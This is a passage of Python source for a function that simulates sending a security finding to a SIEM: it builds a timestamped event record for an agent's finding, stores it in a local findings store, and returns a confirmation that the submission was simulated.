        event_data: Event log or alert data in JSON/text format.
        

    Returns:
        Confirmation message of successful SIEM data submission.
    """
    time.sleep(20)
   
    try:
        details = json.loads(details_json)
        siem_message = {
            "event_id": f"PT_AI_{finding_type.upper()}_{datetime.now().strftime('%f')}",
            "timestamp": datetime.now().isoformat(),
            "source_agent": agent_name,
            "finding_type": finding_type,
            "details": details
        }
        
        insert_finding(agent_name, task_name, "siem_integration_event", siem_message)
        return f"Finding of type '{finding_type}' simulated sent to SIEM."
    except Exception as e:
        return f"Failed to simulate SIEM integration: {e}"
